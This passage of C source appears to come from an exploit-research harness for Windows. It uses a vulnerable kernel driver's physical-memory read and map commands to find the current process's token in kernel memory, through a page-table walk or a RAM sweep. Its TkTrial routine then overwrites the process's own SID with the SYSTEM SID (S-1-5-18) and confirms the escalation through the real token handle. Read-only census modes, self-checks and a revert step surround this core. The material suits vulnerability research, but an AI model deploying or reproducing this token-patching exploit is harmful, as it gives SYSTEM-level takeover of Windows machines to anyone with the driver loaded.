    {   /* first/last 8 parsed entries (layout A) -- which processes
         * does class 64 actually enumerate? */
        LogW(L"[i] [direct] first 8 + last 8 entries (layout A):");
        for (i = 0; i < count; i++) {
            if (i < 8 || i >= count - 8) {
                BYTE *e = buf + 16 + i * 40;
                LogW(L"      [%llu] pid=0x%llx hdl=0x%llx obj=0x%016llx"
                     L" acc=0x%08x", (unsigned long long)i,
                     (unsigned long long)*(UINT64 *)(e + 8),
                     (unsigned long long)*(UINT64 *)(e + 0x10),
                     (unsigned long long)*(UINT64 *)e,
                     (unsigned int)*(ULONG *)(e + 0x14));
            } else if (i == 8) {
                i = count - 9;
            }
        }
    }
    {
        ULONG  nme = 0;
        LogW(L"[i] [direct] all entries with our pid 0x%lx (layout A):",
             pid);
        for (i = 0; i < count; i++) {
            BYTE *e = buf + 16 + i * 40;

            if (*(UINT64 *)(e + 8) != (UINT64)pid)
                continue;
            nme++;
            if (nme <= 32)
                LogW(L"      [%llu] hdl=0x%02llx obj=0x%016llx"
                     L" acc=0x%08x", (unsigned long long)i,
                     (unsigned long long)*(UINT64 *)(e + 0x10),
                     (unsigned long long)*(UINT64 *)e,
                     (unsigned int)*(ULONG *)(e + 0x14));
        }
        LogW(L"[i] [direct] layout-A pid matches: %lu"
             L" (lookup handle 0x%lx)", (unsigned long)nme, hv);
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return FALSE;
}

/* locate OUR kernel token page without any sweep. Returns TRUE and
 * REGISTERS the candidate (kinds 3 = LUID + SID verified by content)
 * only when the walked page carries the pin LUID. Read-only -- safe to
 * run benign in --tokdirect, identical code inside --tkpatch. */
static BOOL TokDirectLocate(HANDLE hSelf, TPAGE *list, UINT32 maxPages,
                            UINT32 *nPages, UINT32 *msOut)
{
    ULONGLONG             t0 = GetTickCount64();
    UINT64                cr3 = 0, hdrKva = 0, hdrPa = 0, pagePa;
    TPAGE                 pg;

    *msOut = 0;
    if (!g_ownLuid || !g_ownSidLen) {
        LogW(L"[x] [direct] TokWhoAmI has not run -- no pin available");
        return FALSE;
    }
    if (!DevCmdCrRead(3, &cr3) || !cr3 || (cr3 & 0xFFF) ||
        cr3 >= 0x10000000000ULL) {
        LogW(L"[x] [direct] CR3 read failed (0x%016llx)",
             (unsigned long long)cr3);
        return FALSE;
    }
    cr3 &= 0x000FFFFFFFFFF000ULL;
    {       /* walk self-check: KI_USER_SHARED_DATA must translate to
             * its fixed PA 0x7FFE0000 -- catches a broken walk before
             * anything trusts its output */
        UINT64 kpa = 0;

        if (KvaToPa(cr3, 0xFFFFF78000000000ULL, &kpa) &&
            kpa == 0x7FFE0000ULL)
            LogW(L"[i] [direct] walk self-check: KUSD -> 0x7ffe0000 ok");
        else
            LogW(L"[!] [direct] walk self-check: KUSD -> 0x%012llx"
                 L" (expected 0x7ffe0000) -- walk suspect",
                 (unsigned long long)kpa);
    }
    if (!TokenObjVaddr(hSelf, &hdrKva) ||
        !(hdrKva >> 48) || (hdrKva >> 16) < 1) {
        LogW(L"[x] [direct] token kernel object address unusable "
             L"(0x%016llx)", (unsigned long long)hdrKva);
        return FALSE;
    }
    if (!KvaToPa(cr3, hdrKva, &hdrPa)) {
        LogW(L"[x] [direct] VA->PA walk failed for 0x%016llx",
             (unsigned long long)hdrKva);
        /* Structural verdict, established by full-dispatch IDA audit
         * (this session): every content transport in the driver is
         * MmMapIoSpace-anchored (physread 0x281C, scan 0x2824, map 0x28A4,
         * capture 0x2888), and 24H2's MmMapIoSpace refuses page-table
         * pages -- the CR3/PML4 page itself comes back NULL (GLE=8 =
         * 0xC0000017 inside sub_140002690) on every boot while pool/user
         * RAM maps fine. The walk must read exactly those pages, and the
         * driver exposes no VA->PA translate primitive. So on this build
         * the direct route can identify the object KVA but not its PA;
         * callers fall back to the proven CMD_SCAN sweep. */
        LogW(L"[i] [direct] CR3 page 0x%012llx is refused by every map "
             L"transport (MmMapIoSpace hardening: page-table pages) -- "
             L"no VA->PA translate primitive exists in the driver; "
             L"caller falls back to CMD_SCAN sweep",
             (unsigned long long)cr3);
        return FALSE;
    }
    pagePa = hdrPa & ~0xFFFULL;
    ZeroMemory(&pg, sizeof(pg));
    if (TokClassifyPage(pagePa, &pg)) {
        LogW(L"[i] [direct] page classified by physread (0xFFF0281C)");
    } else {
        /* the walked PA sits in one of the 1 MB bands where the driver's
         * map primitive refuses (census holes; GLE=8 = STATUS_NO_MEMORY
         * from MmMapIoSpace inside sub_140002690). Fall back to the
         * PROVEN single-page A4 map leg for classification -- identical
         * mechanics to E3 of runs 3/4/10, never bulk. */
        LogW(L"[i] [direct] physread refused (hole band) -- classifying "
             L"via single-page A4 map window");
        if (!TokClassifyMapped(pagePa, &pg, NULL))
            return FALSE;
    }
    LogW(L"[i] [direct] object 0x%016llx -> PA 0x%012llx: Toke=%u "
         L"LUID=%u ourSID=%u bogus=%u", (unsigned long long)hdrKva,
         (unsigned long long)pagePa, pg.nToke, pg.nLuid, pg.nSid,
         pg.nBogus);
    if (!pg.nLuid) {
        LogW(L"[x] [direct] page does not carry the pin LUID -- refusing "
             L"(object/body layout changed or wrong object)");
        return FALSE;
    }
    if (*nPages >= maxPages) {
        LogW(L"[x] [direct] candidate list full");
        return FALSE;
    }
    ZeroMemory(&list[*nPages], sizeof(TPAGE));
    list[*nPages].pagePa = pagePa;
    list[*nPages].kinds  = (BYTE)(2 | (pg.nSid ? 1 : 0)); /* LUID verified;
                                                             SID verified iff present */
    list[*nPages].nToke  = pg.nToke;
    list[*nPages].nSid   = pg.nSid;
    list[*nPages].nLuid  = pg.nLuid;
    list[*nPages].nBogus = pg.nBogus;
    (*nPages)++;
    *msOut = (UINT32)(GetTickCount64() - t0);
    ProofLog(L"[+] E2-direct: token page PA 0x%012llx located WITHOUT any "
             L"sweep (handle enum + CR3 page-table walk, %lu ms; "
             L"Toke=%u LUID=%u ourSID=%u)", (unsigned long long)pagePa,
             (unsigned long)*msOut, pg.nToke, pg.nLuid, pg.nSid);
    return TRUE;
}

/* v5.1.7 --tokdirect: BENIGN mode for the direct route. Same code path
 * --tkpatch uses, with zero writes and zero maps: locate, classify,
 * and cross-check the physical page against the REAL token handle
 * (GetTokenInformation must still read our own SID -- if the physical
 * bytes disagree, the route is wrong and this mode says so). */
static int HarnessTokDirect(void)
{
    HANDLE    hSelf = NULL;
    TPAGE     list[TK_MAXPAGES];
    CONTIGREQ anchor;
    UINT32    nPages = 0, msLoc = 0;
    int       rc = 0, i;

    ProofLog(L"==== --tokdirect (E2-direct lookup, %ls, NO WRITES) ===="
             , TOOL_VERSION);
    ZeroMemory(&anchor, sizeof(anchor));
    if (!MapPreflight(&anchor, FALSE)) {
        ProofLog(L"[x] --tokdirect: class %u -- transport refused",
                 g_prof.cls);
        rc = 3;
        goto out;
    }
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_DUPLICATE | TOKEN_QUERY, &hSelf)) {
        ProofLog(L"[x] --tokdirect: OpenProcessToken failed GLE=%lu",
                 GetLastError());
        rc = 3;
        goto out;
    }
    if (!TokWhoAmI(hSelf)) {
        rc = 3;
        goto out;
    }
    ZeroMemory(list, sizeof(list));
    if (!TokDirectLocate(hSelf, list, TK_MAXPAGES, &nPages, &msLoc)) {
        ProofLog(L"[i] --tokdirect: direct route unavailable on this boot "
                 L"-- the --tkpatch path would fall back to the sweep");
        rc = 1;
        goto out;
    }
    /* content cross-check against the live handle (no mutation anywhere):
     * the page must carry BOTH the pin LUID (TokDirectLocate already
     * refused without it) and OUR full user SID -- the physical bytes and
     * the bytes GetTokenInformation reports must be the same identity. */
    {
        static BYTE ti[0x400];
        ULONG       rl = 0;

        if (!GetTokenInformation(hSelf, TokenUser, ti, sizeof(ti), &rl)) {
            ProofLog(L"[x] --tokdirect: handle cross-read failed GLE=%lu",
                     GetLastError());
            rc = 3;
            goto out;
        }
        for (i = 0; i < (int)nPages; i++)
            LogW(L"    candidate[%u] page 0x%012llx kinds=%u Toke=%u "
                 L"LUID=%u ourSID=%u", i,
                 (unsigned long long)list[i].pagePa, list[i].kinds,
                 list[i].nToke, list[i].nLuid, list[i].nSid);
        if (!list[0].nSid) {
            ProofLog(L"[i] --tokdirect: LUID verified but our SID is not on "
                     L"this page -- --tkpatch would still trial it (the "
                     L"patch verifies through the real handle in E4/E5)");
        }
        ProofLog(L"[+] --tokdirect E2E: physical page carries the SAME "
                 L"identity the real handle reports (SID len %u, authcnt "
                 L"%u) -- route verified, no bytes changed", g_ownSidLen,
                 (unsigned)((SID *)g_ownSid)->SubAuthorityCount);
    }
out:
    if (hSelf)
        CloseHandle(hSelf);
    return rc;
}

/* classify one candidate page with PHYS READS ONLY (no mapping, no
 * writes -- the tokscan promise). Counts every full own-SID, LUID,
 * 'Toke' tag and bogus-SID occurrence in the page image. */
/* content classifier for one token page. Operates on an ALREADY-READ
 * 4 KB window -- both TokClassifyPage (physread source) and the
 * direct-route hole-page path (A4-map source) feed it. */
static void TokClassifyWindow(const BYTE *page, TPAGE *pg)
{
    UINT32 o;

    for (o = 0; o + g_ownSidLen <= 0x1000; o++) {
        if (!memcmp(page + o, g_ownSid, g_ownSidLen))
            pg->nSid++;
        if (!memcmp(page + o, g_bogusSid, g_ownSidLen))
            pg->nBogus++;
        if (!memcmp(page + o, &g_ownLuid, 8))
            pg->nLuid++;
        if (page[o] == 'T' && page[o + 1] == 'o' && page[o + 2] == 'k' &&
            page[o + 3] == 'e')
            pg->nToke++;
    }
}

static BOOL TokClassifyPage(UINT64 pagePa, TPAGE *pg)
{
    static BYTE page[0x1000];
    UINT32 o;

    ZeroMemory(page, sizeof(page));
    for (o = 0; o < 0x1000; o += 0x100)
        if (!DevCmdPhysRead(pagePa + o, page + o, 0x100)) {
            LogW(L"[x] [classify] page 0x%012llx physread failed @+0x%x",
                 (unsigned long long)pagePa, o);
            return FALSE;
        }
    TokClassifyWindow(page, pg);
    return TRUE;
}

/* map-classify: classify a page the physread leg cannot reach (the
 * driver-refused 1 MB bands) by mapping it through the PROVEN 0xFFF028A4
 * leg (the same E3 step runs 3/4/10 used for the token page) and reading
 * the user window. Single page only -- never the bulk user-map that
 * corrupted PFN entries in runs 6-9. Teardown is the benign CMD path. */
static BOOL TokClassifyMapped(UINT64 pagePa, TPAGE *pg, UINT64 *blockOut)
{
    DEVREQ mp;
    BYTE   win[0x1000];
    SIZE_T br = 0;
    UINT32 stW = 0;

    ZeroMemory(&mp, sizeof(mp));
    if (!DevCmdMap(pagePa, 0x1000, 1, &mp) || mp.status != 0 ||
        !mp.userVa) {
        LogW(L"[x] [classify] A4 map of 0x%012llx refused (status 0x%x)"
             L" -- hole-band page is both unphysreadable and unmappable",
             (unsigned long long)pagePa, mp.status);
        return FALSE;
    }
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)mp.userVa, win, 0x1000,
                           &br) || br != 0x1000) {
        LogW(L"[x] [classify] mapped window unreadable (GLE=%lu)",
             GetLastError());
        DevCmdUnmap(mp.block, &stW);
        return FALSE;
    }
    TokClassifyWindow(win, pg);
    if (blockOut)
        *blockOut = mp.block;
    else
        DevCmdUnmap(mp.block, &stW);
    return TRUE;
}

/* verify through the REAL handle: TokenUser must compare equal to `sid`
 * over `len` bytes (len 12 = the S-1-5-18 check, len = g_ownSidLen = the
 * revert check). This is the M6 rule: the window patch is only believed
 * when the OBJECT the handle names reads differently. */
static BOOL TokHandleReads(HANDLE hSelf, const BYTE *sid, UINT32 len)
{
    static BYTE tu[0x400];
    DWORD rl = 0;

    if (!GetTokenInformation(hSelf, TokenUser, tu, sizeof(tu), &rl))
        return FALSE;
    if (rl < 8 + len)
        return FALSE;
    return memcmp(((TOKEN_USER *)tu)->User.Sid, sid, len) == 0;
}

static const UINT64 marker_g0 = 0x1337C0DE11111111ULL;

/* E6 revert: restore the saved page image through the write window, then
 * demand the original SID back through the handle. Never silent: any
 * residual mutation is called out by name (S2 restore is mandatory after
 * this mode regardless). */
static void TkRevert(UINT64 userVa, UINT64 block, const BYTE *orig,
                     HANDLE hSelf)
{
    SIZE_T bw = 0;
    UINT32 stW = 0;

    if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)(ULONG_PTR)userVa,
                            orig, 0x1000, &bw) || bw != 0x1000) {
        LogW(L"[x] E6 revert: WPM of the saved page failed GLE=%lu -- "
             L"PATCHED BYTES MAY REMAIN (S2 restore is mandatory)",
             GetLastError());
        LogW(L"[novel: lifecycle] the A4-map user window had no VAD of its "
             L"own -- WPM refusing here matches the stale-window behavior "
             L"v4 documented");
    } else if (TokHandleReads(hSelf, g_ownSid, g_ownSidLen)) {
        LogW(L"[+] E6 revert: the verified handle reads the original SID "
             L"again -- byte-exact restore confirmed");
    } else {
        LogW(L"[!] E6 revert: WPM went through but the handle does not "
             L"read the original SID -- verify by hand; S2 restore is "
             L"mandatory");
    }
    DevCmdUnmap(block, &stW);
    LogW(L"[i] E6 revert: map block 0x%012llx torn down (0xFFF028A8 "
         L"status %u)", (unsigned long long)block, stW);
}

/* E3+E4+E5 for one candidate page: phys baseline -> A4 map -> E2E
 * window-vs-phys compare -> patch every own-SID instance (M6 style) ->
 * verify THROUGH THE HANDLE. Success leaves the map LIVE (caller reverts
 * it after the spawn). Failure reverts and tears down.
 * v5.1.7 hole-band variant: if the baseline physread is refused (the
 * token page landed in a driver-refused 1 MB band, as the direct route
 * legitimately finds), the baseline is taken FROM the mapped window
 * instead -- the E2E cross-check is then degraded to window-only and the
 * log says so. Patch/verify/revert/unmap flow is unchanged. */
static BOOL TkTrial(UINT64 pagePa, BYTE *orig, HANDLE hSelf,
                    UINT64 *pinPage, UINT64 *pinBlock, UINT64 *pinUserVa)
{
    static const BYTE kSysSid[12] = { 0x01, 0x01, 0, 0, 0, 0, 0, 0x05,
                                      0x12, 0, 0, 0 };
    DEVREQ mp;
    BYTE   win[0x1000], zero[0x40];
    SIZE_T br = 0, bw = 0;
    UINT32 o, nm = 0, np = 0;
    UINT32 stW = 0;
    BOOL   physOK = TRUE;

    ZeroMemory(zero, sizeof(zero));
    for (o = 0; o < 0x1000; o += 0x100)
        if (!DevCmdPhysRead(pagePa + o, orig + o, 0x100)) {
            physOK = FALSE;
            break;
        }
    if (!DevCmdMap(pagePa, 0x1000, 1, &mp) || mp.status != 0 ||
        !mp.userVa || !mp.block) {
        LogW(L"[x] trial: A4 map of 0x%012llx refused (status 0x%x)",
             (unsigned long long)pagePa, mp.status);
        return FALSE;
    }
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)mp.userVa, win, 0x1000,
                           &br) || br != 0x1000) {
        DevCmdUnmap(mp.block, &stW);
        LogW(L"[x] trial: window unreadable on 0x%012llx (GLE=%lu)",
             (unsigned long long)pagePa, GetLastError());
        return FALSE;
    }
    if (physOK) {
        if (memcmp(win, orig, 0x1000)) {
            DevCmdUnmap(mp.block, &stW);
            LogW(L"[i] trial: E2E phys-vs-window MISMATCH on 0x%012llx -- "
                 L"window does not show the baseline; page skipped",
                 (unsigned long long)pagePa);
            return FALSE;
        }
    } else {
        LogW(L"[i] trial: baseline physread refused on 0x%012llx (hole "
             L"band) -- baseline taken from the mapped window; E2E "
             L"cross-check degraded, patch/verify flow unchanged",
             (unsigned long long)pagePa);
        memcpy(orig, win, 0x1000);
    }
    for (o = 0; o + g_ownSidLen <= 0x1000; o++) {
        BYTE  one = 1;
        DWORD sub12 = 0x12;      /* S-1-5-18 subauthority, LE 12 00 00 00 */
        UINT8 oldCnt = win[o + 1];
        BOOL  wok;

        if (memcmp(win + o, g_ownSid, g_ownSidLen) != 0)
            continue;
        nm++;
        wok = WriteProcessMemory(GetCurrentProcess(),
                  (LPVOID)(ULONG_PTR)(mp.userVa + o + 1), &one, 1, &bw) &&
              WriteProcessMemory(GetCurrentProcess(),
                  (LPVOID)(ULONG_PTR)(mp.userVa + o + 8), &sub12, 4, &bw);
        if (wok && oldCnt > 1)
            wok = WriteProcessMemory(GetCurrentProcess(),
                  (LPVOID)(ULONG_PTR)(mp.userVa + o + 12), zero,
                  (oldCnt - 1) * 4, &bw);
        if (!wok) {
            UINT8 *vb = (UINT8 *)(uintptr_t)mp.userVa;

            vb[o + 1] = 1;
            *(volatile DWORD *)(vb + o + 8) = 0x12;
            if (oldCnt > 1)
                memcpy(vb + o + 12, zero, (oldCnt - 1) * 4);
        }
        np++;
        LogW(L"[E4] patched SID instance #%u @ page 0x%012llx +0x%x "
             L"(count %u -> 1, sub[0]=0x12)", nm,
             (unsigned long long)pagePa, o, oldCnt);
        if (nm >= 8)
            break;
    }
    if (!nm) {
        DevCmdUnmap(mp.block, &stW);
        LogW(L"[i] trial: 0x%012llx carries our SID nowhere in-window -- "
             L"not a token of ours", (unsigned long long)pagePa);
        return FALSE;
    }
    /* M6 rule: only believe the patch through the REAL handle */
    if (!TokHandleReads(hSelf, kSysSid, 12)) {
        LogW(L"[x] trial: the handle does NOT read S-1-5-18 after patch -- "
             L"foreign or unlanded token; reverting page-exact");
        TkRevert(mp.userVa, mp.block, orig, hSelf);
        return FALSE;
    }
    *pinPage   = pagePa;
    *pinBlock  = mp.block;
    *pinUserVa = mp.userVa;
    ProofLog(L"[+] E4/E5 PINNED: page 0x%012llx patched and the REAL "
             L"handle now reads S-1-5-18 (TokenInformation E2E) -- our "
             L"token's kernel body", (unsigned long long)pagePa);
    return TRUE;
}

/* v5.1.2 --pfndb: benign READ-ONLY inspector for the run6/run7 0x4E pair.
 * Both crashes died with corrupt PFN 0x1000 = PA 0x1000000 = the FIRST
 * page the A4->A8 pair ever mapped (32 MB once, 4 KB once -- length is
 * exonerated; the PA is the constant). Hypothesis under test: PA
 * 0x1000000 hosts the PFN DATABASE itself in this guest, i.e. the pair
 * is corrupting the PFN entry of its own first mapped page, and "first
 * mapped page" is crash-relevant only as long as the page lands inside
 * the DB. NO map/unmap fires here: ReadPhysBytes only (the proven
 * census reader). Evidence: _MMPFN entries in a 0x18- or 0x20-byte
 * stride holding PTE-space pointers (0xffff8xxx_xxxxxxxx class) and --
 * at base + 0x1000*stride -- the entry that DESCRIBES the DB's own
 * first page (self-referential PteFrame). */
static void RunPfnDb(void)
{
    static const struct { UINT64 pa; const wchar_t *why; } pages[] = {
        { 0x1000000ULL, L"crash window first page (PFN 0x1000, both runs)" },
        { 0x1020000ULL, L"entry[0x1000] if the DB runs a 0x20 stride" },
        { 0x102D000ULL, L"entry[0x1000] if the DB runs a 0x18 stride" },
        { 0xE0000000ULL, L"control: high census-OK band (expect not-DB)" },
        { 0x1000ULL,    L"control: boot-resident low page" },
    };
    UINT32 pg;

    ProofLog(L"==== --pfndb (READ-ONLY inspector, no map calls, %ls) ===="
             , TOOL_VERSION);
    for (pg = 0; pg < 5; pg++) {
        UINT8  buf[0x200];
        UINT64 off;
        UINT32 n8 = 0, n18[3] = { 0, 0, 0 }, n20[4] = { 0, 0, 0, 0 };
        UINT32 hits;

        LogW(L"---- --pfndb page 0x%012llx (%ls)", pages[pg].pa,
             pages[pg].why);
        for (off = 0; off < sizeof(buf); off += 0x100)
            if (!ReadPhysBytes(pages[pg].pa + off, buf + off, 0x100)) {
                LogW(L"[x] --pfndb: read refused at 0x%012llx+%03llx",
                     (unsigned long long)pages[pg].pa,
                     (unsigned long long)off);
                ProofLog(L"[x] --pfndb: read refused at 0x%012llx",
                         (unsigned long long)pages[pg].pa);
                off = (UINT64)-1;
                break;
            }
        if (off == (UINT64)-1)
            continue;
        /* raw head: 12 qwords */
        for (hits = 0; hits < 12; hits++) {
            UINT64 q;
            memcpy(&q, buf + hits * 8, 8);
            LogW(L"    +%03x  0x%016llx", hits * 8, (unsigned long long)q);
        }
        /* stride fingerprints across the 0x200 read */
        for (off = 0; off + 8 <= sizeof(buf); off += 8) {
            UINT64 q;
            memcpy(&q, buf + off, 8);
            if ((q >> 48) < 0xffff8 || (q >> 48) > 0xfffff)
                continue;
            n8++;
            n18[off % 0x18 / 8]++;
            n20[off % 0x20 / 8]++;
        }
        hits = (UINT32)(n18[0] + n18[1] + n18[2]);
        n8 = (UINT32)(n20[0] + n20[1] + n20[2] + n20[3]);
        ProofLog(L"[i] --pfndb 0x%012llx: kernVA qwords total=%u "
                 L"[+0x18-stride %u/%u/%u] [+0x20-stride %u/%u/%u/%u]",
                 (unsigned long long)pages[pg].pa, n8,
                 n18[0], n18[1], n18[2],
                 n20[0], n20[1], n20[2], n20[3]);
        /* self-reference test: the raw head printed above at the two
         * hypothesis pages IS entry[0x1000] for its stride when the DB
         * starts at 0x1000000 -- interpretation is offline, no code. */
    }
    /* pass 2: entropy profile of the crash band + first safe band.
     * Metric: distinct byte values in a 256-byte sample (page tables and
     * PFN-db pages repeat hard; blob/random pages approach 256). Step
     * 64 KB across 0x1000000..0x2000000 (256 samples); 5 spot samples in
     * 0x4000000..0x4000000+1MB for contrast. Read-only. */
    {
        UINT64 pa;
        UINT32 i;

        LogW(L"---- --pfndb entropy profile: distinct bytes / 256-byte "
             L"sample, step 0x10000");
        for (i = 0; i < 256; i++) {
            UINT8 s[0x100];
            UINT8 seen[256];
            UINT32 d = 0, j;

            pa = 0x1000000ULL + (UINT64)i * 0x10000;
            if (!ReadPhysBytes(pa, s, 0x100)) {
                LogW(L"    0x%012llx  READ REFUSED", (unsigned long long)pa);
                continue;
            }
            ZeroMemory(seen, sizeof(seen));
            for (j = 0; j < 0x100; j++)
                seen[s[j]] = 1;
            for (j = 0; j < 256; j++)
                d += seen[j];
            LogW(L"    0x%012llx  distinct=%u", (unsigned long long)pa, d);
        }
        for (i = 0; i < 5; i++) {
            UINT8 s[0x100];
            UINT8 seen[256];
            UINT32 d = 0, j;

            pa = 0x4000000ULL + (UINT64)i * 0x20000;
            if (!ReadPhysBytes(pa, s, 0x100))
                continue;
            ZeroMemory(seen, sizeof(seen));
            for (j = 0; j < 0x100; j++)
                seen[s[j]] = 1;
            for (j = 0; j < 256; j++)
                d += seen[j];
            LogW(L"    0x%012llx  distinct=%u  (safe-band control)",
                 (unsigned long long)pa, d);
        }
    }
    ProofLog(L"---- --pfndb done ----");
}

/* ---- P5 --tokscan : E1+E2 census, NO WRITES -------------------------- */
static int HarnessTokScan(void)
{
    CONTIGREQ anchor;
    HANDLE    hSelf = NULL;
    TPAGE     list[TK_MAXPAGES];
    UINT8     pats[3][8], pofs[3];
    UINT32    nPages = 0, i, bogusTotal = 0, sidPgs = 0, luidPgs = 0;
    int       rc = 0;

    ProofLog(L"==== --tokscan (E1+E2 census, %ls, NO WRITES) ====",
             TOOL_VERSION);
    LogW(L"[novel: lifecycle/argument-forwarding] census feeds the P5 map"
         L"->patch->SYSTEM demo; [prior-art: physmap-class] for the demo "
         L"technique only");
    ZeroMemory(&anchor, sizeof(anchor));
    if (!MapPreflight(&anchor, FALSE)) {
        ProofLog(L"[x] --tokscan: class %u -- map family refused; restore "
                 L"S2 and reboot", g_prof.cls);
        rc = 3;
        goto out;
    }
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY,
                          &hSelf)) {
        ProofLog(L"[x] --tokscan: OpenProcessToken failed GLE=%lu",
                 GetLastError());
        rc = 3;
        goto out;
    }
    if (!TokWhoAmI(hSelf)) {
        rc = 3;
        goto out;
    }
    /* pin pattern: TokenLuid qword (object-aligned, random per token) */
    memcpy(pats[0], &g_ownLuid, 8);
    pofs[0] = 0;
    /* SID variants: S-1-5-21-A-B-C-R, cnt=5: q @sid+0x10 = B|C<<32
     * (8-aligned SID), q @sid+0x14 = C|R<<32 (4+8k SID) */
    memcpy(pats[1], g_ownSid + 0x10, 8);
    pofs[1] = 16;
    memcpy(pats[2], g_ownSid + 0x14, 8);
    pofs[2] = 20;
    ZeroMemory(list, sizeof(list));
    LogW(L"[i] E1 sweep: pin=LUID qword + both own-SID 8-byte alignment "
         L"variants");
    if (!TokSweepAll(pats, pofs, L"[tokscan]", list, TK_MAXPAGES, &nPages, 3)) {
        rc = 3;
        goto out;
    }
    LogW(L"[i] E2 classify: %u candidate pages (%u LUID-kind, %u SID-kind)",
         nPages, luidPgs, sidPgs);
    for (i = 0; i < nPages; i++) {
        if (!TokClassifyPage(list[i].pagePa, &list[i]))
            continue;
        bogusTotal += list[i].nBogus;
        if (list[i].kinds & 2)
            luidPgs++;
        if (list[i].kinds & 1)
            sidPgs++;
        LogW(L"    page 0x%012llx kinds=%u Toke=%u ourSID=%u LUID=%u "
             L"bogus=%u -> %ls", (unsigned long long)list[i].pagePa,
             list[i].kinds, list[i].nToke, list[i].nSid, list[i].nLuid,
             list[i].nBogus,
             list[i].nToke ? L"TOKEN candidate" : L"non-token (tag absent)");
    }
    for (i = 0; i < nPages; i++)
        if (list[i].kinds & 2 && list[i].nToke && list[i].nLuid)
            sidPgs = 0;          /* pin succeeded -- SID pages secondary */
    if (!nPages) {
        ProofLog(L"[x] --tokscan: no candidates at all -- LUID/SID patterns "
                 L"absent from RAM or the sweep bands refused; send the log");
        rc = 2;
    } else if (bogusTotal) {
        ProofLog(L"[x] --tokscan: NEGATIVE SELF-TEST FAILED: bogus-SID "
                 L"(RID+1) matched %u times -- the classifier is broken, "
                 L"do NOT trust the pin", bogusTotal);
        rc = 2;
    } else {
        UINT32 token = 0;

        for (i = 0; i < nPages; i++)
            if (list[i].nToke && (list[i].kinds & 2))
                token++;
        ProofLog(L"[+] --tokscan: %u token-candidate pages (%u "
                 L"LUID-pinned), bogus self-test 0 -- census is clean, "
                 L"--tokmap/--tkpatch may follow", token, luidPgs);
        rc = 0;
    }
out:
    if (hSelf)
        CloseHandle(hSelf);
    {
        CONTIGREQ f = anchor;

        if (anchor.physPa && !DevCmdContigFree(&f))
            LogW(L"[x] --tokscan: anchor free failed (benign detail)");
    }
    ProofLog(L"---- --tokscan done rc=%d ----", rc);
    return rc;
}

/* ---- P5 --tokmap : E3 map + E2E check + intended teardown, NO token
 *       writes ---------------------------------------------------------- */
static int HarnessTokMap(void)
{
    CONTIGREQ anchor;
    HANDLE    hSelf = NULL;
    TPAGE     list[TK_MAXPAGES];
    UINT8     pats[3][8], pofs[3];
    UINT32    nPages = 0, i, tokMaps = 0;
    int       rc = 0;

    ProofLog(L"==== --tokmap (E3 map+verify, %ls, pages mapped and torn "
             L"down, NO token writes) ====", TOOL_VERSION);
    LogW(L"[prior-art: physmap-class] this mode exercises the map "
         L"primitive over token pages only -- the write path stays OFF");
    ZeroMemory(&anchor, sizeof(anchor));
    if (!MapPreflight(&anchor, FALSE)) {
        ProofLog(L"[x] --tokmap: class %u -- map family refused", g_prof.cls);
        rc = 3;
        goto out;
    }
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY,
                          &hSelf)) {
        ProofLog(L"[x] --tokmap: OpenProcessToken failed GLE=%lu",
                 GetLastError());
        rc = 3;
        goto out;
    }
    if (!TokWhoAmI(hSelf)) {
        rc = 3;
        goto out;
    }
    memcpy(pats[0], &g_ownLuid, 8);
    pofs[0] = 0;
    memcpy(pats[1], g_ownSid + 0x10, 8);
    pofs[1] = 16;
    memcpy(pats[2], g_ownSid + 0x14, 8);
    pofs[2] = 20;
    ZeroMemory(list, sizeof(list));
    if (!TokSweepAll(pats, pofs, L"[tokmap]", list, TK_MAXPAGES, &nPages, 3)) {
        rc = 3;
        goto out;
    }
    for (i = 0; i < nPages; i++) {
        DEVREQ  mp;
        UINT32  o;
        BYTE    win[0x1000], bak[0x1000];
        SIZE_T  br = 0;
        TPAGE   cls;
        UINT32  stW = 0;

        if (!TokClassifyPage(list[i].pagePa, &cls)) {
            LogW(L"[x] --tokmap: classify failed on 0x%012llx -- skipped",
                 (unsigned long long)list[i].pagePa);
            continue;
        }
        if (!cls.nToke) {
            LogW(L"[i] page 0x%012llx carries no 'Toke' tag -- not a token",
                 (unsigned long long)list[i].pagePa);
            continue;
        }
        if (!DevCmdMap(list[i].pagePa, 0x1000, 1, &mp) || mp.status != 0 ||
            !mp.userVa || !mp.block) {
            LogW(L"[x] --tokmap: map of 0x%012llx refused (status 0x%x)",
                 (unsigned long long)list[i].pagePa, mp.status);
            continue;
        }
        LogW(L"[+] --tokmap: page 0x%012llx mapped userVa=0x%012llx "
             L"block=0x%012llx",
             (unsigned long long)list[i].pagePa,
             (unsigned long long)mp.userVa, (unsigned long long)mp.block);
        if (!ReadProcessMemory(GetCurrentProcess(),
                               (LPCVOID)(ULONG_PTR)mp.userVa, win,
                               0x1000, &br) || br != 0x1000) {
            LogW(L"[x] --tokmap: window read failed GLE=%lu -- teardown "
                 L"and skip", GetLastError());
            DevCmdUnmap(mp.block, &stW);
            continue;
        }
        if (!DevCmdPhysRead(list[i].pagePa, bak, 0x100)) {
            LogW(L"[x] --tokmap: phys baseline refused");
            DevCmdUnmap(mp.block, &stW);
            continue;
        }
        if (memcmp(win, bak, 0x100))
            LogW(L"[!] --tokmap: E2E window-vs-phys readback MISMATCH "
                 L"(first 0x100 bytes) -- expect a stale mapping or a "
                 L"nonphys target; DO NOT map-extend this boot");
        else
            LogW(L"[+] --tokmap: E2E window-vs-phys readback MATCH over "
                 L"first 0x100 bytes");
        Dump(mp.userVa, 0x40);
        for (o = 0; o + g_ownSidLen <= 0x1000; o++)
            if (!memcmp(win + o, g_ownSid, g_ownSidLen))
                break;
        LogW(L"[i] --tokmap: own-SID present in window: %ls at +0x%x",
             (o + g_ownSidLen <= 0x1000) ? L"yes" : L"no", o);
        DevCmdUnmap(mp.block, &stW);
        LogW(L"[+] --tokmap: teardown 0xFFF028A8 status %u (u32 -- tag-0 "
             L"free leg is the known no-op leak, 0x20 B)", stW);
        tokMaps++;
        if (tokMaps >= 8)
            break;               /* evidence-complete, keep the run short */
    }
    if (!tokMaps) {
